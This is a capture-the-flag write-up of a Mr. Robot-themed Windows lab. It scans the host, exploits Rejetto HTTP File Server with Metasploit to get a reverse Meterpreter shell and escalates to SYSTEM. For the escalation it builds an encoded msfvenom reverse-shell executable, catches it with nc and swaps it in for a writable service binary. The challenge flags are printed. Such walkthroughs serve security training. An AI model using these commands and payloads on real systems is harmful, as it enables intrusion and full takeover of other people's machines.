Room Description: 

Hack into a Mr. Robot themed Windows machine. Use metasploit for initial access, utilise powershell for Windows privilege escalation enumeration and learn a new technique to get Administrator access. 

---

First, I ran a `rustscan`

```bash
rustscan -a 10.129.174.58 --range 1-65535 --ulimit=5000 -- -sV -O 
.----. .-. .-. .----..---.  .----. .---.   .--.  .-. .-.
| {}  }| { } |{ {__ {_   _}{ {__  /  ___} / {} \ |  `| |
| .-. \| {_} |.-._} } | |  .-._} }\     }/  /\  \| |\  |
`-' `-'`-----'`----'  `-'  `----'  `---' `-'  `-'`-' `-'
The Modern Day Port Scanner.
________________________________________
: http://discord.skerritt.blog         :
: https://github.com/RustScan/RustScan :
 --------------------------------------
To scan or not to scan? That is the question.

[~] The config file is expected to be at "/root/.rustscan.toml"
[~] Automatically increasing ulimit value to 5000.
Open 10.129.174.58:80
Open 10.129.174.58:139
Open 10.129.174.58:135
Open 10.129.174.58:445
Open 10.129.174.58:3389
Open 10.129.174.58:5985
Open 10.129.174.58:8080
Open 10.129.174.58:47001
Open 10.129.174.58:49156
Open 10.129.174.58:49152
Open 10.129.174.58:49154
Open 10.129.174.58:49153
Open 10.129.174.58:49155
Open 10.129.174.58:49197
Open 10.129.174.58:49196
[~] Starting Script(s)
[>] Running script "nmap -vvv -p {{port}} -{{ipversion}} {{ip}} -sV -O" on ip 10.129.174.58
Depending on the complexity of the script, results may take some time to appear.
[~] Starting Nmap 7.99 ( https://nmap.org ) at 2026-07-04 12:54 -0400
NSE: Loaded 48 scripts for scanning.
Initiating Ping Scan at 12:54
Scanning 10.129.174.58 [4 ports]
Completed Ping Scan at 12:54, 0.10s elapsed (1 total hosts)
Initiating Parallel DNS resolution of 1 host. at 12:54
Completed Parallel DNS resolution of 1 host. at 12:54, 4.50s elapsed
DNS resolution of 1 IPs took 4.50s. Mode: Async [#: 1, OK: 0, NX: 0, DR: 1, SF: 0, TR: 3, CN: 0]
Initiating SYN Stealth Scan at 12:54
Scanning 10.129.174.58 [15 ports]
Discovered open port 3389/tcp on 10.129.174.58
Discovered open port 49152/tcp on 10.129.174.58
Discovered open port 139/tcp on 10.129.174.58
Discovered open port 80/tcp on 10.129.174.58
Discovered open port 445/tcp on 10.129.174.58
Discovered open port 49197/tcp on 10.129.174.58
Discovered open port 135/tcp on 10.129.174.58
Discovered open port 8080/tcp on 10.129.174.58
Discovered open port 49153/tcp on 10.129.174.58
Discovered open port 5985/tcp on 10.129.174.58
Discovered open port 49156/tcp on 10.129.174.58
Discovered open port 49155/tcp on 10.129.174.58
Discovered open port 49196/tcp on 10.129.174.58
Discovered open port 47001/tcp on 10.129.174.58
Discovered open port 49154/tcp on 10.129.174.58
Completed SYN Stealth Scan at 12:54, 0.18s elapsed (15 total ports)
Initiating Service scan at 12:54
Scanning 15 services on 10.129.174.58
Service scan Timing: About 60.00% done; ETC: 12:56 (0:00:37 remaining)
Completed Service scan at 12:55, 60.18s elapsed (15 services on 1 host)
Initiating OS detection (try #1) against 10.129.174.58
NSE: Script scanning 10.129.174.58.
NSE: Starting runlevel 1 (of 2) scan.
Initiating NSE at 12:55
Completed NSE at 12:55, 0.61s elapsed
NSE: Starting runlevel 2 (of 2) scan.
Initiating NSE at 12:55
Completed NSE at 12:55, 0.37s elapsed
Nmap scan report for 10.129.174.58
Host is up, received timestamp-reply ttl 126 (0.083s latency).
Scanned at 2026-07-04 12:54:52 EDT for 62s

PORT      STATE SERVICE       REASON          VERSION
80/tcp    open  http          syn-ack ttl 126 Microsoft IIS httpd 8.5
135/tcp   open  msrpc         syn-ack ttl 126 Microsoft Windows RPC
139/tcp   open  netbios-ssn   syn-ack ttl 126 Microsoft Windows netbios-ssn
445/tcp   open  microsoft-ds  syn-ack ttl 126 Microsoft Windows Server 2008 R2 - 2012 microsoft-ds
3389/tcp  open  ms-wbt-server syn-ack ttl 126 Microsoft Terminal Services
5985/tcp  open  http          syn-ack ttl 126 Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
8080/tcp  open  http          syn-ack ttl 126 HttpFileServer httpd 2.3
47001/tcp open  http          syn-ack ttl 126 Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
49152/tcp open  msrpc         syn-ack ttl 126 Microsoft Windows RPC
49153/tcp open  msrpc         syn-ack ttl 126 Microsoft Windows RPC
49154/tcp open  msrpc         syn-ack ttl 126 Microsoft Windows RPC
49155/tcp open  msrpc         syn-ack ttl 126 Microsoft Windows RPC
49156/tcp open  msrpc         syn-ack ttl 126 Microsoft Windows RPC
49196/tcp open  msrpc         syn-ack ttl 126 Microsoft Windows RPC
49197/tcp open  msrpc         syn-ack ttl 126 Microsoft Windows RPC
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
```

--- 
## Task 1: Employee of the month:

![](https://github.com/Velatryx/CTF-Writeups/blob/main/AcademyLabs/TryHackMe/Easy/MountainSteel/images/Screenshot%20From%202026-07-04%2020-55-20.png)

Bill Harper from the URL.

## Task 2: Scan the machine with nmap. What is the other port running a web server on?

I tried the most obvious port: 8080

![](https://github.com/Velatryx/CTF-Writeups/blob/main/AcademyLabs/TryHackMe/Easy/MountainSteel/images/Screenshot%20From%202026-07-04%2020-55-56.png)

## Task 3: Take a look at the other web server. What file server is running?

Rejetto HTTP File Server

## Task 4: What is the CVE number to exploit this file server?

```bash
┌──(root㉿kali)-[~]
└─# searchsploit Rejetto HTTP File Server
---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
 Exploit Title                                                                                                                                                                    |  Path
---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
Rejetto HTTP File Server (HFS) - Remote Command Execution (Metasploit)                                                                                                            | windows/remote/34926.rb
Rejetto HTTP File Server (HFS) 1.5/2.x - Multiple Vulnerabilities                                                                                                                 | windows/remote/31056.py
Rejetto HTTP File Server (HFS) 2.2/2.3 - Arbitrary File Upload                                                                                                                    | multiple/remote/30850.txt
Rejetto HTTP File Server (HFS) 2.3.x - Remote Command Execution (1)                                                                                                               | windows/remote/34668.txt
Rejetto HTTP File Server (HFS) 2.3.x - Remote Command Execution (2)                                                                                                               | windows/remote/39161.py
Rejetto HTTP File Server (HFS) 2.3a/2.3b/2.3c - Remote Command Execution                                                                                                          | windows/webapps/34852.txt
Rejetto HTTP File Server 2.3m - Remote Code Execution (RCE)                                                                                                                       | typescript/webapps/52102.py
Rejetto HttpFileServer 2.3.x - Remote Command Execution (3)                                                                                                                       | windows/webapps/49125.py
---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
Shellcodes: No Results
```

> Nikto scan results reveals version:

```bash
┌──(root㉿kali)-[~]
└─# nikto -h 10.128.149.9:8080
- Nikto v2.6.0
---------------------------------------------------------------------------
+ Target IP:          10.128.149.9
+ Target Hostname:    10.128.149.9
+ Target Port:        8080
+ Platform:           Unknown
+ Start Time:         2026-07-07 07:19:52 (GMT-4)
---------------------------------------------------------------------------
+ Server: HFS 2.3
```

[Exploit db result](https://www.exploit-db.com/exploits/39161) for the 2.3 version.

## Task 5: Use Metasploit to get an initial shell. What is the user flag?

```shell
msf > search rejetto http

Matching Modules
================

   #  Name                                                 Disclosure Date  Rank       Check  Description
   -  ----                                                 ---------------  ----       -----  -----------
   0  exploit/windows/http/rejetto_hfs_rce_cve_2024_23692  2024-05-25       excellent  Yes    Rejetto HTTP File Server (HFS) Unauthenticated Remote Code Execution
   1  exploit/windows/http/rejetto_hfs_exec                2014-09-11       excellent  Yes    Rejetto HttpFileServer Remote Command Execution


Interact with a module by name or index. For example info 1, use 1 or use exploit/windows/http/rejetto_hfs_exec

msf > use 1
[*] No payload configured, defaulting to windows/meterpreter/reverse_tcp
msf exploit(windows/http/rejetto_hfs_exec) > options

Module options (exploit/windows/http/rejetto_hfs_exec):

   Name       Current Setting  Required  Description
   ----       ---------------  --------  -----------
   HTTPDELAY  10               no        Seconds to wait before terminating web server
   Proxies                     no        A proxy chain of format type:host:port[,type:host:port][...]. Supported proxies: socks5, socks5h, sapni, http, socks4
   RHOSTS                      yes       The target host(s), see https://docs.metasploit.com/docs/using-metasploit/basics/using-metasploit.html
   RPORT      80               yes       The target port (TCP)
   SRVHOST    0.0.0.0          yes       The local host or network interface to listen on. This must be an address on the local machine or 0.0.0.0 to listen on all addresses.
   SRVPORT    8080             yes       The local port to listen on.
   SRVSSL     false            no        Negotiate SSL/TLS for local server connections
   SSL        false            no        Negotiate SSL/TLS for outgoing connections
   SSLCert                     no        Path to a custom SSL certificate (default is randomly generated)
   TARGETURI  /                yes       The path of the web application
   URIPATH                     no        The URI to use for this exploit (default is random)
   VHOST                       no        HTTP server virtual host


Payload options (windows/meterpreter/reverse_tcp):

   Name      Current Setting  Required  Description
   ----      ---------------  --------  -----------
   EXITFUNC  process          yes       Exit technique (Accepted: '', seh, thread, process, none)
   LHOST     10.0.2.5         yes       The listen address (an interface may be specified)
   LPORT     4444             yes       The listen port

msf exploit(windows/http/rejetto_hfs_exec) > set lhost tun0
lhost => 192.168.152.35
msf exploit(windows/http/rejetto_hfs_exec) > exploit
[*] Started reverse TCP handler on 192.168.152.35:4444 
[*] Using URL: http://192.168.152.35:8080/uUYk2IHhBjnw3Fp
[*] Server started.
[*] Sending a malicious request to /
[*] Payload request received: /uUYk2IHhBjnw3Fp
[*] Sending stage (199238 bytes) to 10.128.149.9
[!] Tried to delete %TEMP%\QJbAL.vbs, unknown result
[*] Meterpreter session 1 opened (192.168.152.35:4444 -> 10.128.149.9:49303) at 2026-07-07 07:28:04 -0400
[*] Server stopped.

meterpreter >
meterpreter > cd Desktop
meterpreter > ls
Listing: C:\Users\bill\Desktop
==============================

Mode              Size  Type  Last modified              Name
----              ----  ----  -------------              ----
100666/rw-rw-rw-  282   fil   2019-09-27 07:07:07 -0400  desktop.ini
100666/rw-rw-rw-  70    fil   2019-09-27 08:42:38 -0400  user.txt

meterpreter > type user.txt
[-] Unknown command: type. Run the help command for more details.
meterpreter > cat user.txt
��b04763b6fcf51fcd7c13abc7db4fd365
```

Thus getting : user.txt

## Task 6: Privilege Escalation

> Let's download PowerUp.ps1 script, and upload it to look for privEsc vectors:

```
Tab 2:
curl -O https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Privesc/PowerUp.ps1

Tab 1:
meterpreter > upload /root/PowerUp.ps1
[*] Uploading  : /root/PowerUp.ps1 -> PowerUp.ps1
[*] Uploaded 586.50 KiB of 586.50 KiB (100.0%): /root/PowerUp.ps1 -> PowerUp.ps1
[*] Completed  : /root/PowerUp.ps1 -> PowerUp.ps1
meterpreter > ls
Listing: C:\Users\bill\Desktop
==============================

Mode              Size    Type  Last modified              Name
----              ----    ----  -------------              ----
100666/rw-rw-rw-  600580  fil   2026-07-07 07:34:29 -0400  PowerUp.ps1
100666/rw-rw-rw-  282     fil   2019-09-27 07:07:07 -0400  desktop.ini
100666/rw-rw-rw-  70      fil   2019-09-27 08:42:38 -0400  user.txt

# LOAD POWERSHELL

meterpreter > load powershell
Loading extension powershell...Success.
meterpreter > powershell_shell
PS > . .\PowerUp.ps1
PS > Invoke-AllChecks


ServiceName    : AdvancedSystemCareService9
Path           : C:\Program Files (x86)\IObit\Advanced SystemCare\ASCService.exe
ModifiablePath : @{ModifiablePath=C:\; IdentityReference=BUILTIN\Users; Permissions=AppendData/AddSubdirectory}
StartName      : LocalSystem
AbuseFunction  : Write-ServiceBinary -Name 'AdvancedSystemCareService9' -Path <HijackPath>
CanRestart     : True
Name           : AdvancedSystemCareService9
Check          : Unquoted Service Paths
```

> The CanRestart option being true, allows us to restart a service on the system, the directory to the application is also write-able. This means we can replace the legitimate application with our malicious one, restart the service, which will run our infected program!

> Use msfvenom to generate a reverse shell as an Windows executable.

> msfvenom -p windows/shell_reverse_tcp LHOST=CONNECTION_IP LPORT=4443 -e x86/shikata_ga_nai -f exe-service -o Advanced.exe

> Upload your binary and replace the legitimate one. Then restart the program to get a shell as root.

> Note: The service showed up as being unquoted (and could be exploited using this technique), however, in this case we have exploited weak file permissions on the service files instead.


--- 

```shell

┌──(root㉿kali)-[~]
└─# msfvenom -p windows/shell_reverse_tcp LHOST=192.168.152.35 LPORT=4443 -e x86/shikata_ga_nai -f exe-service -o Advanced.exe 
[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
[-] No arch selected, selecting arch: x86 from the payload
Found 1 compatible encoders
Attempting to encode payload with 1 iterations of x86/shikata_ga_nai
x86/shikata_ga_nai succeeded with size 351 (iteration=0)
x86/shikata_ga_nai chosen with final size 351
Payload size: 351 bytes
Final size of exe-service file: 12288 bytes
Saved as: Advanced.exe
```

> msfconsole: finding the path of vulnerable service. 

```shell
PS > sc.exe qc AdvancedSystemCareService9
[SC] QueryServiceConfig SUCCESS

SERVICE_NAME: AdvancedSystemCareService9
        TYPE               : 110  WIN32_OWN_PROCESS (interactive)
        START_TYPE         : 2   AUTO_START
        ERROR_CONTROL      : 1   NORMAL
        BINARY_PATH_NAME   : C:\Program Files (x86)\IObit\Advanced SystemCare\ASCService.exe
        LOAD_ORDER_GROUP   : System Reserved
        TAG                : 1
        DISPLAY_NAME       : Advanced SystemCare Service 9
        DEPENDENCIES       :
        SERVICE_START_NAME : LocalSystem
```

> Then, we stop the service, and replace it with our own malicious binary - Advanced.exe (Before doing this, use `nc -lvnp 4443` in another tab):

```shell
PS > sc.exe stop AdvancedSystemCareService9

SERVICE_NAME: AdvancedSystemCareService9
        TYPE               : 110  WIN32_OWN_PROCESS  (interactive)
        STATE              : 4  RUNNING
                                (STOPPABLE, PAUSABLE, ACCEPTS_SHUTDOWN)
        WIN32_EXIT_CODE    : 0  (0x0)
        SERVICE_EXIT_CODE  : 0  (0x0)
        CHECKPOINT         : 0x0
        WAIT_HINT          : 0x0
PS > Copy-Item -Force .\Advanced.exe "C:\Program Files (x86)\IObit\Advanced SystemCare\ASCService.exe"
PS > sc.exe start AdvancedSystemCareService9

SERVICE_NAME: AdvancedSystemCareService9
        TYPE               : 110  WIN32_OWN_PROCESS  (interactive)
        STATE              : 2  START_PENDING
                                (NOT_STOPPABLE, NOT_PAUSABLE, IGNORES_SHUTDOWN)
        WIN32_EXIT_CODE    : 0  (0x0)
        SERVICE_EXIT_CODE  : 0  (0x0)
        CHECKPOINT         : 0x0
        WAIT_HINT          : 0x7d0
        PID                : 1784
        FLAGS              :
```

> We get the shell:
> 
```
┌──(root㉿kali)-[~]
└─# nc -lvnp 4443
listening on [any] 4443 ...
connect to [192.168.152.35] from (UNKNOWN) [10.128.149.9] 49451
Microsoft Windows [Version 6.3.9600]
(c) 2013 Microsoft Corporation. All rights reserved.

C:\Windows\system32>whoami
whoami
nt authority\system

C:\Users\Administrator\Desktop>dir
dir
 Volume in drive C has no label.
 Volume Serial Number is 2E4A-906A

 Directory of C:\Users\Administrator\Desktop

10/12/2020  12:05 PM    <DIR>          .
10/12/2020  12:05 PM    <DIR>          ..
10/12/2020  12:05 PM             1,528 activation.ps1
09/27/2019  05:41 AM                32 root.txt
               2 File(s)          1,560 bytes
               2 Dir(s)  44,157,612,032 bytes free

C:\Users\Administrator\Desktop>type root.txt
type root.txt
9af5f314f57607c00fd09803a587db80
C:\Users\Administrator\Desktop>
```

Finishing the CTF. 
